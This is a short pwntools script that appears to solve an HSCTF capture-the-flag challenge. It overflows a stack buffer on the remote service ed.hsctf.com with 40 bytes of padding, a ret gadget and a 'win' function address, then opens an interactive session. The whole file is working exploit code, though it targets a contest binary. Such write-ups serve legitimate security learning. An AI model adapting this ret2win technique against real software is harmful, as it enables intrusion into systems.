from pwn import * 

#p = process("./ed")
#gdb.attach(p)
p = remote("ed.hsctf.com", 1337)

win = 0x4011d2
ret = 0x401016

payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ" + p64(ret) + p64(win)

p.sendline(payload)
p.recvline()
p.sendline(b"Q")
p.interactive()